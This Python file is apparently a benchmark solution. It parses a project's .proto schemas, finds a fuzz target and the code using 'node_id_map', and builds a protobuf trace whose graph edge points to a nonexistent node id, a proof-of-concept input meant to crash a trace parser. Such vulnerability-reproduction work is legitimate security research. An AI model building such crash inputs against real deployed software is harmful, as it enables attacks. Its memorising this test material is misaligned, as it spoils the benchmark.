import os
import re
import tarfile
import tempfile
import shutil
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Set, Iterable


def _read_text_file(path: str, max_bytes: int = 8 * 1024 * 1024) -> Optional[str]:
    try:
        with open(path, "rb") as f:
            data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            return None
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _strip_proto_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//[^\n]*", "", s)
    return s


def _proto_tokenize(s: str) -> List[str]:
    s = _strip_proto_comments(s)
    token_re = re.compile(r'"(?:\\.|[^"\\])*"|[A-Za-z_]\w*|\d+|[{};<>=\[\],.]')
    return [m.group(0) for m in token_re.finditer(s)]


@dataclass
class ProtoField:
    name: str
    number: int
    type_name: str
    label: str = ""  # "", "optional", "required", "repeated"
    packed: Optional[bool] = None
    oneof: bool = False
    parent_message: str = ""
    file_syntax: str = "proto2"

    resolved_message_type: Optional[str] = None
    is_enum: bool = False

    def is_repeated(self) -> bool:
        return self.label == "repeated"

    def is_message(self) -> bool:
        return self.resolved_message_type is not None

    def scalar_wire_type(self) -> int:
        t = self.type_name
        if self.is_enum:
            return 0
        if t in ("int32", "int64", "uint32", "uint64", "sint32", "sint64", "bool"):
            return 0
        if t in ("fixed64", "sfixed64", "double"):
            return 1
        if t in ("string", "bytes"):
            return 2
        if t in ("fixed32", "sfixed32", "float"):
            return 5
        return 0


@dataclass
class ProtoMessage:
    full_name: str
    fields_by_name: Dict[str, ProtoField] = field(default_factory=dict)
    fields_by_number: Dict[int, ProtoField] = field(default_factory=dict)
    file_syntax: str = "proto2"

    def add_field(self, pf: ProtoField) -> None:
        self.fields_by_name[pf.name] = pf
        self.fields_by_number[pf.number] = pf


class ProtoSchema:
    def __init__(self) -> None:
        self.messages: Dict[str, ProtoMessage] = {}
        self.enums: Set[str] = set()
        self.package_by_file: Dict[str, str] = {}
        self.syntax_by_file: Dict[str, str] = {}

    @staticmethod
    def _parse_qualified_name(tokens: List[str], i: int) -> Tuple[str, int]:
        parts = []
        if i < len(tokens) and tokens[i] == ".":
            parts.append(".")
            i += 1
        while i < len(tokens):
            tok = tokens[i]
            if re.match(r"[A-Za-z_]\w*", tok):
                parts.append(tok)
                i += 1
                if i < len(tokens) and tokens[i] == ".":
                    parts.append(".")
                    i += 1
                    continue
                break
            break
        name = "".join(parts)
        return name, i

    @staticmethod
    def _skip_until(tokens: List[str], i: int, stop_tok: str) -> int:
        while i < len(tokens) and tokens[i] != stop_tok:
            i += 1
        if i < len(tokens) and tokens[i] == stop_tok:
            i += 1
        return i

    @staticmethod
    def _skip_block(tokens: List[str], i: int) -> int:
        if i >= len(tokens) or tokens[i] != "{":
            return i
        depth = 0
        while i < len(tokens):
            if tokens[i] == "{":
                depth += 1
            elif tokens[i] == "}":
                depth -= 1
                if depth == 0:
                    i += 1
                    return i
            i += 1
        return i

    @staticmethod
    def _parse_options(tokens: List[str], i: int) -> Tuple[Dict[str, str], int]:
        opts: Dict[str, str] = {}
        if i >= len(tokens) or tokens[i] != "[":
            return opts, i
        i += 1
        while i < len(tokens) and tokens[i] != "]":
            if re.match(r"[A-Za-z_]\w*", tokens[i]):
                key = tokens[i]
                i += 1
                if i < len(tokens) and tokens[i] == "=":
                    i += 1
                    if i < len(tokens):
                        val = tokens[i]
                        i += 1
                        opts[key] = val.strip('"')
            if i < len(tokens) and tokens[i] == ",":
                i += 1
        if i < len(tokens) and tokens[i] == "]":
            i += 1
        return opts, i

    def parse_proto_file(self, path: str) -> None:
        text = _read_text_file(path, max_bytes=16 * 1024 * 1024)
        if text is None:
            return
        tokens = _proto_tokenize(text)
        i = 0
        package = ""
        syntax = "proto2"
        msg_stack: List[str] = []
        current_file = path

        def current_scope_full() -> str:
            if not msg_stack:
                return package
            return ".".join([package] + msg_stack) if package else ".".join(msg_stack)

        while i < len(tokens):
            tok = tokens[i]
            if tok == "syntax":
                i += 1
                if i < len(tokens) and tokens[i] == "=":
                    i += 1
                    if i < len(tokens) and tokens[i].startswith('"'):
                        syntax = tokens[i].strip('"')
                        i += 1
                    i = self._skip_until(tokens, i, ";")
                else:
                    i += 1
            elif tok == "package":
                i += 1
                name, i = self._parse_qualified_name(tokens, i)
                package = name.lstrip(".")
                i = self._skip_until(tokens, i, ";")
            elif tok == "import":
                i = self._skip_until(tokens, i, ";")
            elif tok == "option":
                i = self._skip_until(tokens, i, ";")
            elif tok == "message":
                i += 1
                if i >= len(tokens) or not re.match(r"[A-Za-z_]\w*", tokens[i]):
                    continue
                msg_name = tokens[i]
                i += 1
                while i < len(tokens) and tokens[i] != "{":
                    i += 1
                if i >= len(tokens) or tokens[i] != "{":
                    continue
                msg_stack.append(msg_name)
                full = current_scope_full()
                pm = ProtoMessage(full_name=full, file_syntax=syntax)
                self.messages[full] = pm
                i += 1
            elif tok == "enum":
                i += 1
                if i >= len(tokens):
                    continue
                enum_name = tokens[i] if re.match(r"[A-Za-z_]\w*", tokens[i]) else ""
                i += 1
                while i < len(tokens) and tokens[i] != "{":
                    i += 1
                if i < len(tokens) and tokens[i] == "{":
                    enum_full = (current_scope_full() + "." + enum_name).lstrip(".") if enum_name else ""
                    if enum_full:
                        self.enums.add(enum_full)
                    i = self._skip_block(tokens, i)
                else:
                    i += 1
            elif tok == "oneof":
                i += 1
                if i < len(tokens) and re.match(r"[A-Za-z_]\w*", tokens[i]):
                    i += 1
                while i < len(tokens) and tokens[i] != "{":
                    i += 1
                if i >= len(tokens) or tokens[i] != "{":
                    continue
                i += 1
                while i < len(tokens) and tokens[i] != "}":
                    label = ""
                    type_name, i2 = self._parse_qualified_name(tokens, i)
                    if not type_name or i2 >= len(tokens):
                        i += 1
                        continue
                    i = i2
                    if i >= len(tokens) or not re.match(r"[A-Za-z_]\w*", tokens[i]):
                        i += 1
                        continue
                    fname = tokens[i]
                    i += 1
                    if i < len(tokens) and tokens[i] == "=":
                        i += 1
                        if i < len(tokens) and re.match(r"\d+", tokens[i]):
                            fnum = int(tokens[i])
                            i += 1
                            opts, i = self._parse_options(tokens, i)
                            i = self._skip_until(tokens, i, ";")
                            full = current_scope_full()
                            if full in self.messages:
                                pf = ProtoField(
                                    name=fname,
                                    number=fnum,
                                    type_name=type_name.lstrip("."),
                                    label=label,
                                    packed=(opts.get("packed") == "true") if "packed" in opts else None,
                                    oneof=True,
                                    parent_message=full,
                                    file_syntax=syntax,
                                )
                                self.messages[full].add_field(pf)
                        else:
                            i = self._skip_until(tokens, i, ";")
                    else:
                        i = self._skip_until(tokens, i, ";")
                if i < len(tokens) and tokens[i] == "}":
                    i += 1
            elif tok == "}":
                if msg_stack:
                    msg_stack.pop()
                i += 1
            else:
                if not msg_stack:
                    i += 1
                    continue
                label = ""
                if tok in ("optional", "required", "repeated"):
                    label = tok
                    i += 1
                    if i >= len(tokens):
                        break
                    tok = tokens[i]
                type_name, i2 = self._parse_qualified_name(tokens, i)
                if not type_name:
                    i += 1
                    continue
                i = i2
                if i >= len(tokens) or not re.match(r"[A-Za-z_]\w*", tokens[i]):
                    i += 1
                    continue
                fname = tokens[i]
                i += 1
                if i < len(tokens) and tokens[i] == "=":
                    i += 1
                    if i < len(tokens) and re.match(r"\d+", tokens[i]):
                        fnum = int(tokens[i])
                        i += 1
                        opts, i = self._parse_options(tokens, i)
                        i = self._skip_until(tokens, i, ";")
                        full = current_scope_full()
                        if full in self.messages:
                            pf = ProtoField(
                                name=fname,
                                number=fnum,
                                type_name=type_name.lstrip("."),
                                label=label,
                                packed=(opts.get("packed") == "true") if "packed" in opts else None,
                                oneof=False,
                                parent_message=full,
                                file_syntax=syntax,
                            )
                            self.messages[full].add_field(pf)
                    else:
                        i = self._skip_until(tokens, i, ";")
                else:
                    i += 1

        self.package_by_file[current_file] = package
        self.syntax_by_file[current_file] = syntax

    def resolve(self) -> None:
        scalar_types = {
            "double",
            "float",
            "int32",
            "int64",
            "uint32",
            "uint64",
            "sint32",
            "sint64",
            "fixed32",
            "fixed64",
            "sfixed32",
            "sfixed64",
            "bool",
            "string",
            "bytes",
        }

        msg_names = set(self.messages.keys())

        def resolve_type(parent_msg: str, type_name: str) -> Tuple[Optional[str], bool]:
            if type_name in scalar_types:
                return None, False
            if type_name.startswith("map<"):
                return None, False
            if "." in type_name:
                # Might already be qualified.
                if type_name in msg_names:
                    return type_name, False
                if type_name in self.enums:
                    return None, True
            # absolute?
            if type_name and type_name[0] == ".":
                tn = type_name[1:]
                if tn in msg_names:
                    return tn, False
                if tn in self.enums:
                    return None, True
                return None, False

            # try scoped resolution
            scopes = []
            if parent_msg:
                parts = parent_msg.split(".")
                for k in range(len(parts), 0, -1):
                    scopes.append(".".join(parts[:k]))
            for scope in scopes:
                cand = scope + "." + type_name
                if cand in msg_names:
                    return cand, False
                if cand in self.enums:
                    return None, True
            # try as package-qualified
            if parent_msg:
                pkg = ".".join(parent_msg.split(".")[:-1])
                if pkg:
                    cand = pkg + "." + type_name
                    if cand in msg_names:
                        return cand, False
                    if cand in self.enums:
                        return None, True
            # try global
            if type_name in msg_names:
                return type_name, False
            if type_name in self.enums:
                return None, True
            return None, False

        for m in self.messages.values():
            for f in m.fields_by_name.values():
                resolved, is_enum = resolve_type(m.full_name, f.type_name)
                f.resolved_message_type = resolved
                f.is_enum = is_enum

    def find_message_full(self, basename: str) -> Optional[str]:
        matches = [k for k in self.messages.keys() if k.split(".")[-1] == basename]
        if not matches:
            return None
        # Prefer common perfetto-style package if present
        perf = [m for m in matches if "perfetto" in m or "protos" in m]
        if perf:
            matches = perf
        # Prefer shorter full name (less nesting) then lexicographically
        matches.sort(key=lambda x: (x.count("."), len(x), x))
        return matches[0]

    def find_fields_by_type_basename(self, msg_full: str, type_basename: str) -> List[ProtoField]:
        msg = self.messages.get(msg_full)
        if not msg:
            return []
        out = []
        for f in msg.fields_by_name.values():
            if f.resolved_message_type and f.resolved_message_type.split(".")[-1] == type_basename:
                out.append(f)
        return out

    def reachable_graph_candidate(self, start_msg_full: str, max_depth: int = 4) -> Tuple[str, List[Tuple[str, str]]]:
        # Returns (best_message_full, path_as_list_of_(parent_msg_full, field_name))
        def score_message(m: ProtoMessage) -> int:
            fields = list(m.fields_by_name.values())
            nodes = []
            edges = []
            for f in fields:
                if f.resolved_message_type and f.is_repeated():
                    n = f.name.lower()
                    t = f.resolved_message_type.split(".")[-1].lower()
                    if "node" in n or t.endswith("node") or t == "node":
                        nodes.append(f)
                    if "edge" in n or t.endswith("edge") or "link" in n or "arc" in n:
                        edges.append(f)
            score = 0
            if nodes:
                score += 20
                if any(f.name.lower() in ("node", "nodes") for f in nodes):
                    score += 5
            if edges:
                score += 20
                if any(f.name.lower() in ("edge", "edges") for f in edges):
                    score += 5
            name = m.full_name.lower()
            if "graph" in name:
                score += 6
            if "snapshot" in name:
                score += 4
            if "memory" in name:
                score += 2
            if nodes and edges:
                score += 10
            return score

        best = start_msg_full
        best_path: List[Tuple[str, str]] = []
        best_score = score_message(self.messages.get(start_msg_full, ProtoMessage(start_msg_full)))

        q: List[Tuple[str, int, List[Tuple[str, str]]]] = [(start_msg_full, 0, [])]
        seen: Set[str] = {start_msg_full}

        while q:
            cur, depth, path = q.pop(0)
            m = self.messages.get(cur)
            if not m:
                continue
            sc = score_message(m)
            if sc > best_score or (sc == best_score and len(path) < len(best_path)):
                best_score = sc
                best = cur
                best_path = path
            if depth >= max_depth:
                continue
            for f in m.fields_by_name.values():
                if not f.resolved_message_type:
                    continue
                nxt = f.resolved_message_type
                if nxt in seen:
                    continue
                seen.add(nxt)
                q.append((nxt, depth + 1, path + [(cur, f.name)]))
        return best, best_path


def _encode_varint(x: int) -> bytes:
    if x < 0:
        x &= (1 << 64) - 1
    out = bytearray()
    while True:
        b = x & 0x7F
        x >>= 7
        if x:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _encode_key(field_number: int, wire_type: int) -> bytes:
    return _encode_varint((field_number << 3) | wire_type)


def _encode_len_delim(field_number: int, payload: bytes) -> bytes:
    return _encode_key(field_number, 2) + _encode_varint(len(payload)) + payload


def _encode_varint_field(field_number: int, value: int) -> bytes:
    return _encode_key(field_number, 0) + _encode_varint(value)


def _is_integer_scalar_type(t: str, is_enum: bool) -> bool:
    if is_enum:
        return True
    return t in ("int32", "int64", "uint32", "uint64", "sint32", "sint64", "bool")


def _choose_id_field(msg: ProtoMessage) -> Optional[ProtoField]:
    fields = list(msg.fields_by_name.values())
    candidates = []
    for f in fields:
        if f.resolved_message_type:
            continue
        if f.is_repeated():
            continue
        if not _is_integer_scalar_type(f.type_name, f.is_enum):
            continue
        lname = f.name.lower()
        score = 0
        if lname == "id":
            score += 100
        if lname.endswith("_id") or lname.endswith("id"):
            score += 40
        if "node" in lname and "id" in lname:
            score += 30
        if "type" in lname:
            score -= 10
        candidates.append((score, f.number, f))
    if not candidates:
        return None
    candidates.sort(key=lambda x: (-x[0], x[1]))
    return candidates[0][2]


def _choose_ref_scalar_field(msg: ProtoMessage, exclude_numbers: Set[int]) -> Optional[ProtoField]:
    candidates = []
    for f in msg.fields_by_name.values():
        if f.resolved_message_type:
            continue
        if f.number in exclude_numbers:
            continue
        if not f.is_repeated():
            continue
        if not _is_integer_scalar_type(f.type_name, f.is_enum):
            continue
        lname = f.name.lower()
        score = 0
        if "child" in lname or "children" in lname:
            score += 30
        if "ref" in lname or "reference" in lname:
            score += 25
        if "edge" in lname or "to" == lname or lname.endswith("_to"):
            score += 20
        if "target" in lname or "dst" in lname or "dest" in lname:
            score += 20
        if "node" in lname and "id" in lname:
            score += 15
        if "type" in lname:
            score -= 10
        candidates.append((score, f.number, f))
    if not candidates:
        return None
    candidates.sort(key=lambda x: (-x[0], x[1]))
    return candidates[0][2]


def _choose_edge_endpoints(edge_msg: ProtoMessage) -> Tuple[Optional[ProtoField], Optional[ProtoField]]:
    src_cands = []
    dst_cands = []
    for f in edge_msg.fields_by_name.values():
        if f.resolved_message_type:
            continue
        if f.is_repeated():
            continue
        if not _is_integer_scalar_type(f.type_name, f.is_enum):
            continue
        lname = f.name.lower()
        sscore = 0
        dscore = 0
        if "source" in lname or lname.startswith("src") or lname.endswith("_src") or lname.startswith("from") or "from" == lname:
            sscore += 40
        if "target" in lname or lname.startswith("dst") or lname.endswith("_dst") or lname.startswith("to") or "to" == lname or "dest" in lname:
            dscore += 40
        if "from" in lname:
            sscore += 20
        if "to" in lname:
            dscore += 20
        if "node" in lname and "id" in lname:
            sscore += 10
            dscore += 10
        if sscore:
            src_cands.append((sscore, f.number, f))
        if dscore:
            dst_cands.append((dscore, f.number, f))
    src = None
    dst = None
    if src_cands:
        src_cands.sort(key=lambda x: (-x[0], x[1]))
        src = src_cands[0][2]
    if dst_cands:
        dst_cands.sort(key=lambda x: (-x[0], x[1]))
        dst = dst_cands[0][2]

    if src and dst and src.number == dst.number:
        dst = None

    if (src is None) or (dst is None):
        ints = [f for f in edge_msg.fields_by_name.values() if (not f.resolved_message_type and not f.is_repeated() and _is_integer_scalar_type(f.type_name, f.is_enum))]
        ints.sort(key=lambda f: f.number)
        if src is None and ints:
            src = ints[0]
        if dst is None and len(ints) >= 2:
            dst = ints[1]
    return src, dst


def _choose_nodes_field(container: ProtoMessage) -> Optional[ProtoField]:
    cands = []
    for f in container.fields_by_name.values():
        if not f.resolved_message_type:
            continue
        if not f.is_repeated():
            continue
        lname = f.name.lower()
        t = f.resolved_message_type.split(".")[-1].lower()
        score = 0
        if lname in ("node", "nodes"):
            score += 50
        if "node" in lname:
            score += 25
        if t.endswith("node") or t == "node":
            score += 20
        if "edge" in lname:
            score -= 20
        cands.append((score, f.number, f))
    if not cands:
        return None
    cands.sort(key=lambda x: (-x[0], x[1]))
    return cands[0][2]


def _choose_edges_field(container: ProtoMessage) -> Optional[ProtoField]:
    cands = []
    for f in container.fields_by_name.values():
        if not f.resolved_message_type:
            continue
        if not f.is_repeated():
            continue
        lname = f.name.lower()
        t = f.resolved_message_type.split(".")[-1].lower()
        score = 0
        if lname in ("edge", "edges"):
            score += 50
        if "edge" in lname:
            score += 25
        if "link" in lname or "arc" in lname:
            score += 15
        if t.endswith("edge") or t == "edge":
            score += 20
        if "node" in lname:
            score -= 5
        cands.append((score, f.number, f))
    if not cands:
        return None
    cands.sort(key=lambda x: (-x[0], x[1]))
    return cands[0][2]


def _encode_scalar_repeated(field: ProtoField, values: List[int]) -> bytes:
    if not values:
        return b""
    pack_default = (field.file_syntax == "proto3")
    pack = field.packed if field.packed is not None else (pack_default and _is_integer_scalar_type(field.type_name, field.is_enum))
    if pack and _is_integer_scalar_type(field.type_name, field.is_enum):
        payload = b"".join(_encode_varint(v) for v in values)
        return _encode_len_delim(field.number, payload)
    # unpacked
    out = bytearray()
    wt = field.scalar_wire_type()
    if wt != 0:
        # Only implementing varint repeats for now; fall back to varint encoding for safety.
        wt = 0
    for v in values:
        out += _encode_key(field.number, wt)
        out += _encode_varint(v)
    return bytes(out)


def _build_graph_container(schema: ProtoSchema, container_full: str, missing_id: int = 2) -> bytes:
    container = schema.messages.get(container_full)
    if not container:
        return b""
    nodes_field = _choose_nodes_field(container)
    edges_field = _choose_edges_field(container)

    out = bytearray()

    node_id = 1

    if nodes_field and nodes_field.resolved_message_type in schema.messages:
        node_msg = schema.messages[nodes_field.resolved_message_type]
        nid_field = _choose_id_field(node_msg)
        node_bytes = bytearray()
        if nid_field:
            node_bytes += _encode_varint_field(nid_field.number, node_id)

        exclude = {nid_field.number} if nid_field else set()
        ref_field = _choose_ref_scalar_field(node_msg, exclude_numbers=exclude)
        if ref_field:
            node_bytes += _encode_scalar_repeated(ref_field, [missing_id])

        # If no ref field, still encode node only; edge likely triggers.
        out += _encode_len_delim(nodes_field.number, bytes(node_bytes))

    if edges_field and edges_field.resolved_message_type in schema.messages:
        edge_msg = schema.messages[edges_field.resolved_message_type]
        src_f, dst_f = _choose_edge_endpoints(edge_msg)
        edge_bytes = bytearray()
        if src_f:
            edge_bytes += _encode_varint_field(src_f.number, node_id)
        if dst_f:
            edge_bytes += _encode_varint_field(dst_f.number, missing_id)
        else:
            # If no dst, set any other integer id-ish field to missing_id as best effort
            ints = [f for f in edge_msg.fields_by_name.values() if (not f.resolved_message_type and not f.is_repeated() and _is_integer_scalar_type(f.type_name, f.is_enum))]
            ints.sort(key=lambda f: f.number)
            for f in ints:
                if not src_f or f.number != src_f.number:
                    edge_bytes += _encode_varint_field(f.number, missing_id)
                    break
        out += _encode_len_delim(edges_field.number, bytes(edge_bytes))

    # Populate some context fields if present and cheap
    for name in ("pid", "process_id", "upid", "timestamp", "ts", "snapshot_id", "sequence_id", "seq_id"):
        f = container.fields_by_name.get(name)
        if f and not f.resolved_message_type and not f.is_repeated() and _is_integer_scalar_type(f.type_name, f.is_enum):
            out += _encode_varint_field(f.number, 1)

    return bytes(out)


def _wrap_along_path(schema: ProtoSchema, start_msg_full: str, target_msg_full: str, path: List[Tuple[str, str]], target_payload: bytes) -> bytes:
    # path is list of (parent_msg_full, field_name) from start to target, excluding start itself
    cur_payload = target_payload
    for parent_full, field_name in reversed(path):
        parent = schema.messages.get(parent_full)
        if not parent:
            break
        f = parent.fields_by_name.get(field_name)
        if not f:
            break
        wrapper = _encode_len_delim(f.number, cur_payload)
        # Add minimal likely context fields at intermediate nodes if they exist (optional)
        for n in ("pid", "process_id", "upid", "timestamp", "ts", "snapshot_id", "sequence_id", "seq_id"):
            ff = parent.fields_by_name.get(n)
            if ff and not ff.resolved_message_type and not ff.is_repeated() and _is_integer_scalar_type(ff.type_name, ff.is_enum):
                wrapper += _encode_varint_field(ff.number, 1)
                break
        cur_payload = wrapper
    return cur_payload


def _find_project_root(extracted_dir: str) -> str:
    try:
        entries = [e for e in os.listdir(extracted_dir) if e not in (".", "..")]
        if len(entries) == 1:
            p = os.path.join(extracted_dir, entries[0])
            if os.path.isdir(p):
                return p
    except Exception:
        pass
    return extracted_dir


def _iter_files(root: str) -> Iterable[str]:
    for dp, _, fn in os.walk(root):
        for f in fn:
            yield os.path.join(dp, f)


def _infer_vuln_basename(root: str) -> str:
    best_file = None
    best_count = 0
    for p in _iter_files(root):
        if not (p.endswith((".cc", ".cpp", ".c", ".h", ".hpp", ".inc"))):
            continue
        t = _read_text_file(p, max_bytes=4 * 1024 * 1024)
        if not t:
            continue
        c = t.count("node_id_map")
        if c > best_count:
            best_count = c
            best_file = (p, t)
    if not best_file:
        return "MemorySnapshot"

    _, text = best_file
    # Prefer decoder type near node_id_map
    candidates: List[Tuple[int, str]] = []
    for m in re.finditer(r"node_id_map", text):
        start = max(0, m.start() - 1500)
        end = min(len(text), m.start() + 1500)
        window = text[start:end]
        for rx in (
            r"pbzero::([A-Za-z_]\w*)::Decoder",
            r"gen::([A-Za-z_]\w*)\b",
            r"protos::([A-Za-z_]\w*)\b",
        ):
            for mm in re.finditer(rx, window):
                name = mm.group(1)
                score = 0
                lname = name.lower()
                if "snapshot" in lname:
                    score += 50
                if "graph" in lname:
                    score += 40
                if "memory" in lname:
                    score += 30
                if "heap" in lname:
                    score += 10
                candidates.append((score, name))
    if not candidates:
        # fall back to any decoder in file
        for mm in re.finditer(r"pbzero::([A-Za-z_]\w*)::Decoder", text):
            candidates.append((0, mm.group(1)))
    if not candidates:
        return "MemorySnapshot"
    candidates.sort(key=lambda x: (-x[0], x[1]))
    return candidates[0][1]


def _infer_input_kind_and_message(root: str, vuln_basename: str) -> Tuple[str, Optional[str]]:
    # Returns ("trace"|"tracepacket"|"message", message_basename_if_message)
    fuzzer_files = []
    for p in _iter_files(root):
        if not p.endswith((".cc", ".cpp", ".c")):
            continue
        t = _read_text_file(p, max_bytes=6 * 1024 * 1024)
        if not t:
            continue
        if "LLVMFuzzerTestOneInput" in t:
            fuzzer_files.append((p, t))
    candidates = fuzzer_files
    if not candidates:
        # Try to find a main that parses protobuf
        for p in _iter_files(root):
            if not p.endswith((".cc", ".cpp", ".c")):
                continue
            t = _read_text_file(p, max_bytes=6 * 1024 * 1024)
            if not t:
                continue
            if re.search(r"\bint\s+main\s*\(", t):
                candidates.append((p, t))

    best_text = None
    best_score = -1
    for _, t in candidates:
        score = 0
        if "TraceProcessor" in t or "Trace::Decoder" in t or "TracePacket::Decoder" in t:
            score += 20
        if vuln_basename in t:
            score += 30
        if "memory" in t.lower() and ("snapshot" in t.lower() or "graph" in t.lower()):
            score += 10
        if score > best_score:
            best_score = score
            best_text = t

    t = best_text or ""
    if "TraceProcessor" in t or re.search(r"\bTrace(::Decoder)?\b", t) or re.search(r"pbzero::Trace::Decoder", t):
        return "trace", None
    if re.search(r"pbzero::TracePacket::Decoder\s+\w+\s*\(\s*data\s*,\s*size\s*\)", t):
        return "tracepacket", None

    m = re.search(r"pbzero::([A-Za-z_]\w*)::Decoder\s+\w+\s*\(\s*data\s*,\s*size\s*\)", t)
    if m:
        bn = m.group(1)
        if bn.lower() in ("trace", "tracepacket"):
            return ("trace" if bn.lower() == "trace" else "tracepacket"), None
        return "message", bn

    m = re.search(r"([A-Za-z_]\w*(?:::[A-Za-z_]\w*)*)\s+\w+\s*;\s*\w+\.ParseFromArray\s*\(\s*data\s*,\s*size\s*\)", t)
    if m:
        bn = m.group(1).split("::")[-1]
        if bn.lower() in ("trace", "tracepacket"):
            return ("trace" if bn.lower() == "trace" else "tracepacket"), None
        return "message", bn

    return "trace", None


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        root = None
        try:
            if os.path.isdir(src_path):
                root = src_path
            else:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmpdir)
                root = _find_project_root(tmpdir)

            vuln_basename = _infer_vuln_basename(root)

            schema = ProtoSchema()
            proto_files = []
            for p in _iter_files(root):
                if p.endswith(".proto"):
                    proto_files.append(p)
            for p in proto_files:
                schema.parse_proto_file(p)
            schema.resolve()

            kind, direct_msg_bn = _infer_input_kind_and_message(root, vuln_basename)

            missing_id = 2

            def build_for_message(msg_full: str) -> bytes:
                best_container, path = schema.reachable_graph_candidate(msg_full, max_depth=5)
                container_payload = _build_graph_container(schema, best_container, missing_id=missing_id)
                if not container_payload:
                    # fallback: emit an empty message with a bogus high-number field
                    return _encode_len_delim(1, b"") + _encode_varint_field(2, 1)
                wrapped = _wrap_along_path(schema, msg_full, best_container, path, container_payload)
                return wrapped

            if kind == "message":
                base = direct_msg_bn or vuln_basename
                msg_full = schema.find_message_full(base) or schema.find_message_full(vuln_basename)
                if not msg_full:
                    return b"\x00"
                return build_for_message(msg_full)

            tracepacket_full = schema.find_message_full("TracePacket")
            trace_full = schema.find_message_full("Trace")

            if kind == "tracepacket" or not trace_full:
                if not tracepacket_full:
                    # Fallback: raw bytes unlikely to parse; try minimal
                    return b"\x0a\x00"
                packet_msg = schema.messages[tracepacket_full]
                # Choose field in packet to inject vuln message
                field = None
                # Prefer type matching inferred vuln message
                vuln_full = schema.find_message_full(vuln_basename)
                if vuln_full:
                    fields = schema.find_fields_by_type_basename(tracepacket_full, vuln_basename)
                    if fields:
                        field = sorted(fields, key=lambda f: f.number)[0]
                if field is None:
                    # Find a message-typed field in TracePacket that can reach a graph
                    best_field = None
                    best_score = -1
                    for f in packet_msg.fields_by_name.values():
                        if not f.resolved_message_type:
                            continue
                        cand_best, _ = schema.reachable_graph_candidate(f.resolved_message_type, max_depth=4)
                        # Score by whether candidate contains nodes/edges
                        score = 0
                        cm = schema.messages.get(cand_best)
                        if cm:
                            nf = _choose_nodes_field(cm)
                            ef = _choose_edges_field(cm)
                            if nf:
                                score += 20
                            if ef:
                                score += 20
                            if nf and ef:
                                score += 10
                            if "snapshot" in f.name.lower() or "graph" in f.name.lower():
                                score += 5
                        if score > best_score:
                            best_score = score
                            best_field = f
                    field = best_field

                payload = b""
                if field and field.resolved_message_type:
                    inner = build_for_message(field.resolved_message_type)
                    payload += _encode_len_delim(field.number, inner)

                # Add timestamp/sequence id if present
                for nm in ("timestamp", "trusted_packet_sequence_id", "sequence_id", "seq_id"):
                    ff = packet_msg.fields_by_name.get(nm)
                    if ff and not ff.resolved_message_type and not ff.is_repeated() and _is_integer_scalar_type(ff.type_name, ff.is_enum):
                        payload += _encode_varint_field(ff.number, 1)

                if not payload:
                    payload = _encode_varint_field(1, 1)
                return payload

            # kind == "trace"
            if not (trace_full and tracepacket_full):
                return b"\x0a\x00"

            trace_msg = schema.messages[trace_full]
            packet_fields = [f for f in trace_msg.fields_by_name.values() if f.resolved_message_type and f.resolved_message_type == tracepacket_full]
            if not packet_fields:
                # Fallback: assume field number 1 is packet
                packet_field_number = 1
            else:
                packet_fields.sort(key=lambda f: f.number)
                packet_field_number = packet_fields[0].number

            # Build trace packet bytes
            packet_bytes = b""
            packet_msg = schema.messages[tracepacket_full]

            # Prefer field that matches inferred vuln message type, else best reachable graph field
            vuln_full = schema.find_message_full(vuln_basename)
            chosen_field = None
            if vuln_full:
                fields = schema.find_fields_by_type_basename(tracepacket_full, vuln_basename)
                if fields:
                    fields.sort(key=lambda f: f.number)
                    chosen_field = fields[0]

            if chosen_field is None:
                best_field = None
                best_score = -1
                for f in packet_msg.fields_by_name.values():
                    if not f.resolved_message_type:
                        continue
                    cand_best, _ = schema.reachable_graph_candidate(f.resolved_message_type, max_depth=4)
                    cm = schema.messages.get(cand_best)
                    score = 0
                    if cm:
                        nf = _choose_nodes_field(cm)
                        ef = _choose_edges_field(cm)
                        if nf:
                            score += 20
                        if ef:
                            score += 20
                        if nf and ef:
                            score += 10
                        if "snapshot" in f.name.lower():
                            score += 6
                        if "graph" in f.name.lower():
                            score += 4
                        if vuln_basename.lower() in f.name.lower():
                            score += 8
                    if score > best_score:
                        best_score = score
                        best_field = f
                chosen_field = best_field

            if chosen_field and chosen_field.resolved_message_type:
                inner = build_for_message(chosen_field.resolved_message_type)
                packet_bytes += _encode_len_delim(chosen_field.number, inner)

            # Add minimal timestamp / sequence id
            for nm in ("timestamp", "trusted_packet_sequence_id", "sequence_id", "seq_id"):
                ff = packet_msg.fields_by_name.get(nm)
                if ff and not ff.resolved_message_type and not ff.is_repeated() and _is_integer_scalar_type(ff.type_name, ff.is_enum):
                    packet_bytes += _encode_varint_field(ff.number, 1)

            if not packet_bytes:
                packet_bytes = _encode_varint_field(1, 1)

            trace_bytes = _encode_len_delim(packet_field_number, packet_bytes)
            return trace_bytes

        finally:
            if root != src_path:
                shutil.rmtree(tmpdir, ignore_errors=True)